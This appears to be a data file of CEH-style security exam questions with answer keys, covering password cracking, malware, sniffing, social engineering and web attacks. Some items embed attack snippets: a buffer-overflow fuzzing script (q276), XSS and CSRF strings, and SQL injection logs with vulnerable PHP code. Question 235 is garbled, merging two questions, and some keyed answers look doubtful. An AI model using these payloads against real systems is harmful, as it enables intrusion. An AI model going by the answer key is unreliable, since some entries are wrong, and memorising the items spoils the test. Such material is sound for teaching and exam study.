+"219. Which of the following is the best countermeasure to encrypting ransomwares?
+A. Use multiple antivirus softwares
+B. Keep some generation of off-line backup
+C. Analyze the ransomware to get decryption key of encrypted data
+D. Pay a ransom
+","B
+",219
+"201. In cryptanalysis and computer security, ‘pass the hash’ is a hacking technique that allows an attacker to authenticate to a remote server/service by using the underlying NTLM and/or LanMan hash of a user’s password, instead of requiring the associated plaintext password as is normally the case. Metasploit Framework has a module for this technique: psexec. The psexec module is often used by penetration testers to obtain access to a given system that you already know the credentials for. 
+It was written by sysinternals and has been integrated within the framework. Often as penetration testers, successfully gain access to a system through some exploit, use meterpreter to grab the passwords or other methods like fgdump, pwdump, or cachedump and then utilize rainbow tables to crack those hash values. Which of the following is true hash type and sort order that is using in the psexec module’s smbpass’?
+A. NT:LM
+B. LM:NT
+C. LM:NTLM
+D. NTLM:LM
+","B
+",201
+"202. What attack is used to crack passwords by using a precomputed table of hashed passwords?
+A. Brute Force Attack
+B. Hybrid Attack
+C. Rainbow Table Attack
+D. Dictionary Attack
+","C
+",202
+"203. A company is using Windows Server 2003 for its Active Directory (AD). What is the most efficient way to crack the passwords for the AD users?
+A. Perform a dictionary attack.
+B. Perform a brute force attack.
+C. Perform an attack with a rainbow table.
+D. Perform a hybrid attack.
+","C
+",203
+"204. Which method of password cracking takes the most time and effort?
+Brute force
+Dictionary attack
+Rainbow tables
+Shoulder surfing
+","Brute force
+",204
+"205. How can rainbow tables be defeated?
+Password salting
+Lockout accounts under brute force password cracking attempts
+All uppercase character passwords
+Use of non-dictionary words
+","Password salting
+",205
+"206. A computer science student needs to fill some information into a secured Adobe PDF job application that was received from a prospective employer. Instead of requesting a new document that allowed the forms to be completed, the student decides to write a script that pulls passwords from a list of commonly used passwords to try against the secured PDF until the correct password is found or the list is exhausted. Which cryptography attack is the student attempting?
+A. Session hijacking
+B. Man-in-the-middle attack
+C. Brute-force attack
+D. Dictionary attack
+","D
+",206
+"207. You have gained physical access to a Windows 2008 R2 server, which has an accessible disc drive. When you attempt to boot the server and log in, you are unable to guess the password. In your toolkit, you have an Ubuntu 9.10 Linux LiveCD. Which Linux-based tool can change any user’s password or activate disabled Windows accounts?
+Cain & Abel
+SET
+John the Ripper
+CHNTPW
+","CHNTPW
+",207
+"208. A hacker has managed to gain access to a Linux host and stolen the password file from /etc/passwd How can he use it?
+He can open it and read the user ids and corresponding passwords.
+The password file does not contain the passwords themselves.
+He cannot read it because it is encrypted
+The file reveals the passwords to the root user only.
+","The password file does not contain the passwords themselves.
+",208
+"209. John the Ripper is a technical assessment tool used to test the weakness of which of the following?
+Firewall rulesets
+File permissions
+Passwords
+Usernames
+","Passwords
+",209
+"210. There are several ways to gain insight on how a cryptosystem works with the goal of reverse engineering the process. A term describes when two pieces of data result in the same value is?
+A. Collision
+B. Collusion
+C. Polymorphism
+D. Escrow
+","A
+",210
+"211. What is a “Collision attack” in cryptography?
+A. Collision attacks try to find two inputs producing the same hash.
+B. Collision attacks try to break the hash into two parts, with the same bytes in each part to get the private key.
+C. Collision attacks try to get the public key.
+D. Collision attacks try to break the hash into three parts to get the plaintext value.
+","A
+",211
+"212. Which property ensures that a hash function will not produce the same hashed value for two different messages?
+A. Collision resistance
+B. Bit length
+C. Key strength
+D. Entropy
+","A
+",212
+"213. A hacker searches in Google for filetype:pcf to find Cisco VPN config files. Those files may contain connectivity passwords that can be decoded with which of the following?
+A. Cupp
+B. Nessus
+C. Cain and Abel
+D. John The Ripper Pro
+","C
+",213
+"214. The following is a sample of output from a penetration tester’s machine targeting a machine with the IP address of 192.168.1.106:
+[ATTEMPT] target 192.168.1.108 -login '"root'" -pass '"a'" 1 of 20
+[ATTEMPT] target 192.168.1.108 -login '"root'" -pass '"123'" 2 of 20 
+[ATTEMPT] target 192.168.1.108 -login '"testuser'" -pass '"a'" 3 of 20
+[ATTEMPT] target 192.168.1.108 -login '"testuser'" -pass '"123'" 4 of 20
+[ATTEMPT] target 192.168.1.108 -login '"admin'" -pass '"a'" 5 of 20 
+What is most likely taking place?
+A. Ping sweep of the 192.168.1.106 network
+B. Remote service brute force attempt
+C. Port scan of 192.168.1.106
+D. Denial of service attack on 192.168.1.106
+","B
+",214
+"215. Ricardo wants to send secret messages to a competitor company. To secure these messages, he uses a technique of hiding a secret message within an ordinary message. The technique provides ‘security through obscurity’. What technique is Ricardo using?
+Public-key cryptography
+RSA algorithm
+Steganography
+Encryption
+","Steganography
+",215
+"216. Eve stole a file named secret.txt, transferred it to her computer and she just entered these commands:
+[eve@localhost ~]$ john secret.txt
+Loaded 2 password hashes with no different salts (LM [DES 128/128 SSE2-16])
+Press ‘q’ or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:03 3/3 0g/s 86168p/s 86168c/s 172336C/s MERO..SAMPLUI
+0g 0:00:00:04 3/3 0g/s 3296Kp/s 3296Kc/s 6592KC/s GOS..KARIS4
+0g 0:00:00:07 3/3 0g/s 8154Kp/s 8154Kc/s 16309KC/s NY180K..NY1837
+0g 0:00:00:10 3/3 0g/s 7958Kp/s 7958Kc/s 15917KC/s SHAGRN..SHENY9
+What is she trying to achieve?
+She is encrypting the file.
+She is using John the Ripper to crack the passwords in the secret.txt file.
+She is using John the Ripper to view the contents of the file.
+She is using ftp to transfer the file to another hacker named John.
+","She is using John the Ripper to crack the passwords in the secret.txt file.
+",216
+"217. Which of the following is an application that requires a host application for replication?
+A. Micro
+B. Worm (Operates by itself)
+C. Trojan (Spread through user interaction e.g. email attachment)
+D. Virus (Rely on host to spread)
+","D
+",217
+"218. It is a kind of malware (malicious software) that criminals install on your computer so they can lock it from a remote location. This malware generates a pop-up window, webpage, or email warning from what looks like an official authority. It explains that your computer has been locked because of possible illegal activities on it and demands payment before you can access your files and programs again. What type of malware is it that restricts access to a computer system that it infects and demands that the user pay a certain amount of money, cryptocurrency, etc. to the operators of the malware to remove the restriction?
+A. Ransomware
+B. Riskware
+C. Adware
+D. Spyware
+","A
+",218
+"221. A virus that attempts to install itself inside of the file it is infecting is called?
+Polymorphic virus
+Tunneling virus (Bypass/intercept anti-virus, installing itself)
+Stealth virus
+Cavity virus (Install itself without damaging program itself)
+","Cavity virus (Install itself without damaging program itself)
+",221
+"222. Which of the following viruses tries to hide from anti-virus programs by actively altering and corrupting the chosen service call interruptions when they are being run?
+Cavity virus (Install itself without damaging program itself)
+Tunneling virus
+Polymorphic virus
+Stealth virus
+","Stealth virus
+",222
+"223. Which of the following program infects the system boot sector and the executable files at the same time?
+Multipartite Virus
+Macro virus (Written in macro, infects Microsoft or similar applications)
+Polymorphic virus (Self-encrypted virus designed to avoid detection, duplicates itself)
+Stealth virus (Hidden computer virus that attacks OS processes and averts anti-virus scans)
+","Multipartite Virus
+",223
+"224. A hacker has successfully infected an internet-facing server which he will then use to send junk mail, take part in coordinated attacks, or host junk email content.
+Which sort of trojan infects this server?
+Turtle Trojans
+Banking Trojans
+Botnet Trojan
+Ransomware Trojans
+","Botnet Trojan
+",224
+"225. A server has been infected by a certain type of Trojan. The hacker intended to utilize it to send and host junk mails. What type of Trojan did the hacker use?
+A. Turtle Trojans
+B. Ransomware Trojans
+C. Botnet Trojan
+D. Banking Trojans
+","C
+",225
+"226. A botnet can be managed through which of the following?
+A. IRC
+B. E-Mail
+C. Linkedin and Facebook
+D. A vulnerable FTP server
+","A
+",226
+"227. You are working as a Security Analyst in a company XYZ that owns the whole subnet range of 23.0.0.0/8 and 192.168.0.0/8. While monitoring the data, you find a high number of outbound connections. You see that IP’s owned by XYZ (Internal) and private IP’s are communicating to a Single Public IP. Therefore, the Internal IP’s are sending data to the Public IP. After further analysis, you find out that this Public IP is a blacklisted IP, and the internal communicating devices are compromised.
+What kind of attack does the above scenario depict?
+","Botnet Attack (Issuing commands to perform malicious activities such as DDoS, sending of spam mail, information theft)
+",227
+"228. Which of the following items of a computer system will an anti-virus program scan for viruses?
+A. Boot Sector
+B. Deleted Files
+C. Windows Process List
+D. Password Protected Files
+","A
+",228
+"229. Which of the following BEST describes the mechanism of a Boot Sector Virus?
+A. Moves the MBR to another location on the hard disk and copies itself to the original location of the MBR (Master Boot Record)
+B. Moves the MBR to another location on the RAM and copies itself to the original location of the MBR
+C. Overwrites the original MBR and only executes the new virus code
+D. Modifies directory table entries so that directory entries point to the virus code instead of the actual program
+","A
+",229
+"230. Matthew received an email with an attachment named “YouWon$10Grand.zip.” The zip file contains a file named “HowToClaimYourPrize.docx.exe.” Out of excitement and curiosity, Matthew opened the said file. Without his knowledge, the file copies itself to Matthew’s APPDATA\\IocaI directory and begins to beacon to a Command-and-control server to download additional malicious binaries. What type of malware has Matthew encountered?
+A. Key-logger
+B. Trojan
+C. Worm
+D. Macro Virus
+","B
+",230
+"231. Jesse receives an email with an attachment labeled “Court_Notice_21206.zip”. Inside the zip file is a file named “Court_Notice_21206.docx.exe” disguised as a word document. Upon execution, a window appears stating, “This word document is corrupt.” In the background, the file copies itself to Jesse APPDATA\local directory and begins to beacon to a C2 server to download additional malicious binaries.
+What type of malware has Jesse encountered?
+Trojan
+Macro Virus
+Worm
+Key-Logger
+","Trojan
+",231
+"232. Initiating an attack against targeted businesses and organizations, threat actors compromise a carefully selected website by inserting an exploit resulting in malware infection. The attackers run exploits on well-known and trusted sites likely to be visited by their targeted victims. Aside from carefully choosing sites to compromise, these attacks are known to incorporate zero-day exploits that target unpatched vulnerabilities. Thus, the targeted entities are left with little or no defense against these exploits.
+What type of attack is outlined in the scenario?
+A. Watering Hole Attack (attack a group)
+B. Heartbleed Attack
+C. Shellshock Attack
+D. Spear Phishing Attack
+","A
+",232
+"233. Which of the following is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet.
+A. Heartbleed Bug
+B. POODLE
+C. SSL/TLS Renegotiation Vulnerability
+D. Shellshock
+","A
+",233
+"234. The Heartbleed bug was discovered in 2014 and is widely referred to under MITRE’s Common Vulnerabilities and Exposures (CVE) as CVE-2014-0160. This bug affects the OpenSSL implementation of the transport layer security (TLS) protocols defined in RFC6520. What type of key does this bug leave exposed to the Internet making exploitation of any compromised system very easy?
+Root
+Shared
+Public
+Private
+","Private
+",234
+"235. An engineer is learning to write exploits in C++ and is using the exploit tool Backtrack. The engineer wants to compile the newest C++ exploit and name it calc.exe. Which command would the engineer use to accomplish this?
+A. g++ hackersExploit.cpp -o calc.exe
+B. g++ hackersExploit.py -o calc.exe
+C. g++ -i hackersExploit.pl -o calc.exe
+D. g++ –compile –i hackersExploit.cpp -o calc.exe
+Chandler works as a pen-tester in an IT-firm in New York. As a part of detecting viruses in the systems, he uses a detection method where the anti-virus executes the malicious codes on a virtual machine to simulate CPU and memory activities. Which type of virus detection method did Chandler use in this context?
+","A & Code emulation
+",235
+"236. Rebecca commonly sees an error on her Windows system that states that a Data Execution Prevention (DEP) error has taken place. Which of the following is most likely taking place ?
+Malware is executing in either ROM or a cache memory area.
+Malicious code is attempting to execute instruction in a non-executable memory region.
+A race condition is being exploited, and the operating system is containing the malicious process
+A page fault is occurring, which forces the operating system to write data from the hard drive
+","Malicious code is attempting to execute instruction in a non-executable memory region.
+",236
+"237. How is sniffing broadly categorized?
+A. Active and passive
+B. Broadcast and unicast
+C. Unmanaged and managed
+D. Filtered and unfiltered
+","A
+",237
+"238. You need a tool that can do network intrusion prevention and intrusion detection, function as a network sniffer, and record network activity. What tool would you most likely select?
+Cain & Abel
+Nessus
+Nmap
+Snort
+","Snort
+",238
+"239. Which of the following identifies the three modes in which Snort can be configured to run?
+A. Sniffer, Packet Logger, and Network Intrusion Detection System
+B. Sniffer, Network Intrusion Detection System, and Host Intrusion Detection System
+C. Sniffer, Host Intrusion Prevention System, and Network Intrusion Prevention System
+D. Sniffer, Packet Logger, and Host Intrusion Prevention System
+","A
+",239
+"240. This configuration allows NIC to pass all traffic it receives to the Central Processing Unit (CPU), instead of passing only the frames that the controller is intended to receive. Select the option that BEST describes the above statement.
+A. Multi-cast mode
+B. WEM
+C. Promiscuous mode
+D. Port forwarding
+","C
+",240
+"241. Which of the following is the BEST way to defend against network sniffing?
+A. Using encryption protocols to secure network communications
+B. Register all machines MAC Address in a Centralized Database
+C. Restrict Physical Access to Server Rooms hosting Critical Servers
+D. Use Static IP Address
+","A
+",241
+"242. Which of the following statements is TRUE?
+Sniffers operate on Layer 2 of the OSI model
+Sniffers operate on both Layer 2 & Layer 3 of the OSI model
+Sniffers operate on the Layer 1 of the OSI model
+Sniffers operate on Layer 3 of the OSI model
+","Sniffers operate on Layer 2 of the OSI model
+",242
+"243. A hacker, who posed as a heating and air conditioning specialist, was able to install a sniffer program in a switched environment network. Which attack could the hacker use to sniff all of the packets in the network?
+A. Fraggle (Send UDP traffic to IP broadcast)
+B. MAC Flood
+C. Smurf
+D. Tear Drop
+","B
+",243
+"244. When conducting a penetration test, it is crucial to use all means to get all available information about the target network. One of the ways to do that is by sniffing the network. Which of the following cannot be performed by the passive network sniffing?
+Identifying operating systems, services, protocols and devices
+Collecting unencrypted information about usernames and passwords
+Capturing a network traffic for further analysis
+Modifying and replaying captured network traffic
+","Modifying and replaying captured network traffic
+",244
+"245. Which of the following is a form of penetration testing that relies heavily on human interaction and often involves tricking people into breaking normal security procedures?
+A. Social Engineering
+B. Piggybacking
+C. Tailgating
+D. Eavesdropping
+","A
+",245
+"246. Which of the following is a low-tech way of gaining unauthorized access to systems
+Eavesdropping
+Sniffing
+Scanning
+Social engineering
+","Social engineering
+",246
+"247. You are tasked to perform a penetration test. While you are performing information gathering, you find an employee list in Google. You find the receptionist’s email, and you send her an email changing the source email to her boss’s email( boss@company ). In this email, you ask for a pdf with information. She reads your email and sends back a pdf with links. You exchange the pdf links with your malicious links (these links contain malware) and send back the modified pdf, saying that the links don’t work. She reads your email, opens the links, and her machine gets infected. You now have access to the company network.
+What testing method did you use?
+A. Social engineering
+B. Tailgating
+C. Piggybacking
+D. Eavesdropping
+","A
+",247
+"248. A security consultant decides to use multiple layers of anti-virus defense, such as end user desktop anti-virus and E-mail gateway. This approach can be used to mitigate which kind of attack?
+A. Forensic attack
+B. ARP spoofing attack
+C. Social engineering attack
+D. Scanning attack
+","C
+",248
+"249. When utilizing technical assessment methods to assess the security posture of a network, which of the following techniques would be most effective in determining whether end-user security training would be beneficial?
+A. Vulnerability scanning
+B. Social engineering
+C. Application security testing
+D. Network sniffing
+","B
+",249
+"250. The company ABC recently discovered that their new product was released by the opposition before their premiere. They contract an investigator who discovered that the maid threw away papers with confidential information about the new product and the opposition found it in the garbage. What is the name of the technique used by the opposition?
+A. Hack attack
+B. Sniffing
+C. Dumpster diving
+D. Spying
+","C
+",250
+"251. The Open Web Application Security Project (OWASP) is the worldwide not-for-profit charitable organization focused on improving the security of software. What item is the primary concern on OWASP’s Top Ten Project Most Critical Web Application Security Risks?
+A. Injection
+B. Cross Site Scripting
+C. Cross Site Request Forgery
+D. Path disclosure
+","A
+",251
+"252. Which Open Web Application Security Project (OWASP) implements a web application full of known vulnerabilities?
+A. WebBugs
+B. WebGoat
+C. VULN_HTML
+D. WebScarab
+","B
+",252
+"253. When comparing the testing methodologies of Open Web Application Security Project (OWASP) and Open Source Security Testing Methodology Manual (OSSTMM) the main difference is
+A. OWASP is for web applications and OSSTMM does not include web applications.
+B. OSSTMM is gray box testing and OWASP is black box testing.
+C. OWASP addresses controls and OSSTMM does not.
+D. OSSTMM addresses controls and OWASP does not.
+","D
+",253
+"254. The Open Web Application Security Project (OWASP) testing methodology addresses the need to secure web applications by providing which one of the following services?
+A. An extensible security framework named COBIT
+B. A list of flaws and how to fix them
+C. Web application patches
+D. A security certification for hardened web applications
+","B
+",254
+"255. If an e-commerce site was put into a live environment and the programmers failed to remove the secret entry point that was used during the application development, what is this secret entry point known as?
+A. SDLC process
+B. Honey pot
+C. SQL injection
+D. Trap door
+","D
+",255
+"256. A hacker was able to easily gain access to a website. He was able to log in via the frontend user login form of the website using default or commonly used credentials. This exploitation is an example of what Software design flaw?
+A. Insufficient security management
+B. Insufficient database hardening
+C. Insufficient input validation
+D. Insufficient exception handling
+","C
+",256
+"257. While performing data validation of web content, a security technician is required to restrict malicious input. Which of the following processes is an efficient way of restricting malicious input?
+A. Validate web content input for query strings.
+B. Validate web content input with scanning tools.
+C. Validate web content input for type, length, and range.
+D. Validate web content input for extraneous queries.
+","C
+",257
+"258. Code injection is a form of attack in which a malicious user
+Inserts text into a data field that gets interpreted as code.
+Gains access to the codebase on the server and inserts new code.
+Gets the server to execute arbitrary code using a buffer overflow.
+Inserts additional code into the JavaScript running in the browser.
+","Inserts text into a data field that gets interpreted as code.
+",258
+"259. An attacker has been successfully modifying the purchase price of items purchased on the company’s web site. The security administrators verify the web server and Oracle database have not been compromised directly. They have also verified the Intrusion Detection System (IDS) logs and found no attacks that could have caused this. 
+What is the mostly likely way the attacker has been able to modify the purchase price?
+A. By using SQL injection
+B. By changing hidden form values
+C. By using cross site scripting
+D. By utilizing a buffer overflow attack
+","B
+",259
+"260. While performing online banking using a Web browser, Kyle receives an email that contains an image of a wellcrafted art. Upon clicking the image, a new tab on the web browser opens and shows an animated GIF of bills and coins being swallowed by a crocodile. After several days, Kyle noticed that all his funds on the bank was gone. What Web browser-based security vulnerability got exploited by the hacker?
+A. Clickjacking
+B. Web Form Input Validation
+C. Cross-Site Request Forgery
+D. Cross-Site Scripting
+","C
+",260
+"261. Cross-site request forgery involves
+A browser making a request to a server without the user’s knowledge
+Modification of a request by a proxy between client and server.
+A server making a request to another server without the user’s knowledge
+A request sent by a malicious user from a browser to a server
+","A browser making a request to a server without the user’s knowledge
+",261
+"262. What type of a vulnerability/attack is it when the malicious person forces the user’s browser to send an authenticated request to a server?
+Cross-site request forgery
+Server side request forgery
+Cross-site scripting
+Session hijacking
+","Cross-site request forgery
+",262
+"263. Which of the following conditions must be given to allow a tester to exploit a Cross-Site Request Forgery (CSRF) vulnerable web application?
+A. The victim user must open the malicious link with an Internet Explorer prior to version 8.
+B. The session cookies generated by the application do not have the HttpOnly flag set.
+C. The victim user must open the malicious link with a Firefox prior to version 3.
+D. The web application should not use random tokens.
+","D
+",263
+"264. Identify the web application attack where the attackers exploit vulnerabilities in dynamically generated web pages to inject client-side script into web pages viewed by other users
+Cross-Site Scripting (XSS)
+Cross-Site Request Forgery (CSRF)
+LDAP Injection attack
+SQL injection attack
+","Cross-Site Scripting (XSS)
+",264
+"265. A company’s Web development team has become aware of a certain type of security vulnerability in their Web software. To mitigate the possibility of this vulnerability being exploited, the team wants to modify the software requirements to disallow users from entering HTML as input into their Web application.
+What kind of Web application vulnerability likely exists in their software?
+Session management vulnerability
+Cross-site Request Forgery vulnerability
+Cross-site scripting vulnerability
+SQL injection vulnerability
+","Cross-site scripting vulnerability
+",265
+"266. While testing the company’s web applications, a tester attempts to insert the following test script into the search area on the company’s web site:
+alert(” Testing Testing Testing “)
+Afterwards, when the tester presses the search button, a pop-up box appears on the screen with the text: “Testing Testing Testing”. Which vulnerability has been detected in the web application?
+A. Buffer overflow
+B. Cross-site request forgery
+C. Distributed denial of service
+D. Cross-site scripting
+","D
+",266
+"267. A security analyst in an insurance company is assigned to test a new web application that will be used by clients to help them choose and apply for an insurance plan. The analyst discovers that the application is developed in ASP scripting language and it uses MSSQL as a database backend. The analyst locates the application’s search form and introduces the following code in the search input field:
+IMG SRC=vbscript:msgbox(“Vulnerable”);> originalAttribute=”SRC” originalPath=”vbscript:msgbox
+(“Vulnerable”);>”
+When the analyst submits the form, the browser returns a pop-up window that says “Vulnerable”.
+Which web applications vulnerability did the analyst discover?
+A. Cross-site request forgery
+B. Command injection
+C. Cross-site scripting
+D. SQL injection
+","C
+",267
+"268. During a penetration test, a tester finds that the web application being analyzed is vulnerable to Cross Site Scripting (XSS). Which of the following conditions must be met to exploit this vulnerability?
+A. The web application does not have the secure flag set.
+B. The session cookies do not have the HttpOnly flag set.
+C. The victim user should not have an endpoint security solution.
+D. The victim’s browser must have ActiveX technology enabled.
+","B
+",268
+"269. An attacker changes the profile information of a particular user (victim) on the target website. The attacker uses this string to update the victim’s profile to a text file and then submit the data to the attacker’s database.
+'"< iframe src=””http://www.vulnweb.com/updateif.php”&#8221; style=””display:none”” > < /iframe >'"
+What is this type of attack (that can use either HTTP GET or HTTP POST) called?
+SQL Injection
+Cross-Site Scripting
+Browser Hacking
+Cross-Site Request Forgery
+","Cross-Site Request Forgery
+",269
+"270. Insecure direct object reference is a type of vulnerability where the application does not verify if the user is authorized to access the internal object via its name or key. Suppose a malicious user Rob tries to get access to the account of a benign user Ned. Which of the following requests best illustrates an attempt to exploit an insecure direct object reference vulnerability?
+GET //restricted//goldtransferto=Rob&from=1 or 1=1` HTTP1.1Host westbank.com
+GET //restricted//bank.getaccount(‘Ned’) HTTP1.1 Host westbank.com
+GET //restricted//accounts/?name=Ned HTTP1.1 Host westbank.com
+GET //restricted//(\r\n/\%00account%00Ned%00access HTTP1.1 Host westbank.com
+","GET /restricted/accounts/?name=Ned HTTP1.1 Host westbank.com
+",270
+"271. Which of the following is the BEST way to protect Personally Identifiable Information (PII) from being exploited due to vulnerabilities of varying web applications?
+A. Use cryptographic storage to store all PII
+B. Use full disk encryption on all hard drives to protect PII
+C. Use encrypted communications protocols to transmit PII
+D. Use a security token to log into all Web applications that use PII
+","A
+",271
+"272. Which of the following is the BEST approach to prevent Cross-site Scripting (XSS) flaws?
+A. Use digital certificates to authenticate a server prior to sending data.
+B. Verify access right before allowing access to protected information and UI controls.
+C. Verify access right before allowing access to protected information and UI controls.
+D. Validate and escape all information sent to a server.
+","D
+",272
+"347. The following are types of Bluetooth attack EXCEPT_____?
+A. Bluejacking (sends spam in the form of text messages to the devices)
+B. Bluebugging (complete takeover of a phone)
+C. Bluesnarfing (leave open some of the private information, unlikely to happen)
+D. Bluedriving (Wardriving, lookup services)
+","D
+",347
+"273. A developer for a company is tasked with creating a program that will allow customers to update their billing and shipping information. The billing address field used is limited to 50 characters. What pseudo code would the developer use to avoid a buffer overflow attack on the billing address field?
+A. if (billingAddress = 50) {update field} else exit
+B. if (billingAddress != 50) {update field} else exit
+C. if (billingAddress >= 50) {update field} else exit
+D. if (billingAddress <= 50) {update field} else exit
+","D
+",273
+"274. A recently hired network security associate at a local bank was given the responsibility to perform daily scans of the internal network to look for unauthorized devices. The employee decides to write a script that will scan the network for unauthorized devices every morning at 5:00 am. Which of the following programming languages would most likely be used?
+A. PHP
+B. C#
+C. Python
+D. ASP.NET
+","C
+",274
+"275. Which of the following programming languages is most susceptible to buffer overflow attacks, due to its lack of
+a built-in-bounds checking mechanism?
+Code:
+#include <string.h>
+int main(){
+char buffer[8];
+strcpy(buffer, ““11111111111111111111111111111””);
+}
+Output:
+Segmentation fault
+A. C#
+B. Python
+C. Java
+D. C++
+","D
+",275
+"276. #!/usr/bin/python
+import socket
+buffer=[“A”]counter=50
+while len(buffer)<=100:
+buffer.apend (“A”*counter)
+counter=counter+50
+commands=
+[“HELP”,“STATS.”,“RTIME.”,“LTIME.”,“SRUN.”,“TRUN.”,“GMON.”,“GDOG.”,“KSTET.”,“GTER.”,“HTER.”,“LTER.
+”,“KSTAN.”]
+for command in commands:
+for buffstring in buffer:
+print “Exploiting” +command+“:”+str(len(buffstring))
+s=socket.socket(socket.AF_INET.socket.SOCK_STREAM)
+s.connect((‘127.0.0.1’,9999))
+s.recv(50)
+s.send(command+buffstring)
+s.close()
+What is the code written for?
+A. Buffer Overflow
+B. Encryption
+C. Bruteforce
+D. Denial-of-service (Dos)
+","A
+",276
+"277. A company’s security policy states that all Web browsers must automatically delete their HTTP browser cookies upon terminating. What sort of security breach is this policy attempting to mitigate?
+A. Attempts by attackers to access Web sites that trust the Web browser user by stealing the user’s authentication credentials.
+B. Attempts by attackers to access the user and password information stored in the company’s SQL database.
+C. Attempts by attackers to access passwords stored on the user’s computer without the user’s knowledge.
+D. Attempts by attackers to determine the user’s Web browser usage patterns, including when sites were visited and for how long.
+","A
+",277
+"278. While using your bank’s online servicing you notice the following string in the URL bar: “http://www.MyPersonalBank.com/account?
+id=368940911028389&Damount=10980&Camount=21” You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflect the changes. Which type of vulnerability is present on this site?
+A. Web Parameter Tampering
+B. Cookie Tampering
+C. XSS Reflection
+D. SQL injection
+","A
+",278
+"279. What technique is used to perform a Connection Stream Parameter Pollution (CSPP) attack?
+A. Injecting parameters into a connection string using semicolons as a separator
+B. Inserting malicious Javascript code into input parameters
+C. Setting a user’s session identifier (SID) to an explicit known value
+D. Adding multiple parameters with the same name in HTTP requests
+","A
+",279
+"280. When you are testing a web application, it is very useful to employ a proxy tool to save every request and response. You can manually test every request and analyze the response to find vulnerabilities. You can test parameter and headers manually to get more precise results than if using web vulnerability scanners.
+What proxy tool will help you find web vulnerabilities?
+Dimitry
+Proxychains
+Burpsuite
+Maskgen
+","Burpsuite
+",280
+"281. You are looking for SQL injection vulnerability by sending a special character to web applications. Which of the following is the most useful for quick validation?
+Blackslash
+Semicolon
+Double quotation
+Single quotation
+","Single quotation
+",281
+"282. A tester has been hired to do a web application security test. The tester notices that the site is dynamic and must make use of a back end database. In order for the tester to see if SQL injection is possible, what is the first character that the tester should use to attempt breaking a valid SQL request?
+Semicolon
+Single quote
+Double quote
+Exclamation mark
+","Single quote
+",282
+"283. What is the best description of SQL Injection?
+A. It is an attack used to gain unauthorized access to a database.
+B. It is an attack used to modify code in an application.
+C. It is a Man-in-the-Middle attack between your SQL Server and Web App Server.
+D. It is a Denial of Service Attack.
+","A
+",283
+"284. Which of the following is used to indicate a single-line comment in structured query language (SQL)?
+A. —
+B. ||
+C. %%
+D. ”
+","A
+",284
+"285. Which tool is used to automate SQL injections and exploit a database by forcing a given web application to connect to another database controlled by a hacker?
+A. DataThief
+B. NetCat
+C. Cain and Abel
+D. SQLInjector
+","A
+",285
+"286. What is attempting an injection attack on a web server based on responses to True/False questions called?
+A. Compound SQLi
+B. DMS-specific SQLi
+C. Classic SQLi
+D. Blind SQLi
+","D
+",286
+"287. What is the main difference between a “Normal” SQL Injection and a “Blind” SQL Injection vulnerability?
+A. The request to the web server is not visible to the administrator of the vulnerable application.
+B. The attack is called “Blind” because, although the application properly filters user input, it is still vulnerable to code injection.
+C. The successful attack does not show an error message to the administrator of the affected application.
+D. The vulnerable application does not display errors with information about the injection results to the attacker.
+","D
+",287
+"288. A security administrator notices that the log file of the company’s webserver contains suspicious entries:
+\[20/m1r/2011:10:49:07\]`GET/login.php?user=test`+oR+3>2%20-- HTTP/1.1` 200 9958
+\[20/m1r/2011:10:51:02\]`GET/login.php?user=admin`;2%20-- HTTP/1.1` 200 9978
+The administrator decides to further investigate and analyze the source code of login.php file:
+<?php
+include(`../../config/db_connect.php`);
+$user = $_GET[`user`];
+$pass = $_GET[`pass`];
+$sql = `SELECT * FROM USERS HERE username = $user AND password = `$pass``;
+$result = mysql_query($sql) or die(`couldn`t execute query`);
+if(mysql_num_rows($result) != 0) echo `Authentication granted`;
+else echo `authentication failed`;
+?>
+Based on source code analysis, the analyst concludes that the login.php script is vulnerable to
+A. command injection.
+B. SQL injection.
+C. directory traversal.
+D. LDAP injection.
+","B
+",288
+"348. It is a short-range wireless communication technology that allows mobile phones, computers and other devices to connect and communicate. This technology intends to replace cables connecting portable devices with high regards to security.
+A. Bluetooth
+B. Radio-Frequency Identification
+C. WLAN
+D. InfraRed
+","A
+",348
+"289. If an attacker uses the command SELECT FROM user WHERE name = ‘x’ AND userid IS NULL; –‘; which type of SQL injection attack is the attacker performing
+A. Tautology (Use OR operator so that query always TRUE)
+B. Piggy-backed (Input additional queries to original, first query is valid and the subsequent are injected queries)
+C. Union (Returns a dataset that is union of the result of original query and injected queries)
+","A
+",289
+"290. You are attempting to man-in-the-middle a session. Which protocol will allow you to guess a sequence number?
+A. TCP
+B. UPD
+C. ICMP
+D. UPX
+","A
+",290
+"291. An attacker attaches a rogue router in a network. He wants to redirect traffic to a LAN attached to his router as part of a man-in-the-middle attack. What measure on behalf of the legitimate admin can mitigate this attack?
+A. Only using OSPFv3 will mitigate this risk.
+B. Make sure that legitimate network routers are configured to run routing protocols with authentication.
+C. Redirection of the traffic cannot happen unless the admin allows it explicitly.
+D. Disable all routing protocols and only use static routes.
+","B
+",291
+"292. An attacker, using a rogue wireless AP, performed an MITM attack and injected an HTML code to embed a malicious applet in all HTTP connections. When users accessed any page, the applet ran and exploited many machines. Which one of the following tools the hacker probably used to inject HTML code?
+A. Wireshark
+B. Ettercap
+C. Aircrack-ng
+D. Tcpdump
+","B (putting network interface to promiscuous mode, ARP poisoning target machines)
+",292
+"293. Which of the following is an example of IP spoofing?
+A. SQL injections
+B. Man-in-the-middle
+C. Cross-site scripting
+D. ARP poisoning
+","B
+",293
+"294. Which of the following tools performs comprehensive tests against web servers, including dangerous files and CGIs?
+A. Nikto
+B. Snort
+C. John the Ripper
+D. Dsniff
+","A
+",294
+"295. Why should the security analyst disable/remove unnecessary ISAPI filters?
+To defend against webserver attacks
+To defend against social engineering attacks
+To defend against wireless attacks
+To defend against jailbreaking
+","To defend against webserver attacks
+",295
+"296. How does an operating system protect the passwords used for account logins?
+A. The operating system performs a one-way hash of the passwords.
+B. The operating system stores the passwords in a secret file that users cannot find.
+C. The operating system encrypts the passwords, and decrypts them when needed.
+D. The operating system stores all passwords in a protected segment of non-volatile memory.
+","A
+",296
+"297. Which of the following techniques does a vulnerability scanner use in order to detect a vulnerability on a target service?
+A. Port scanning
+B. Banner grabbing
+C. Injecting arbitrary data
+D. Analyzing service response
+","D
+",297
+"298. Which tool can be used to silently copy files from USB devices?
+A. USB Grabber
+B. USB Dumper
+C. USB Sniffer
+D. USB Snoopy
+","B
+",298
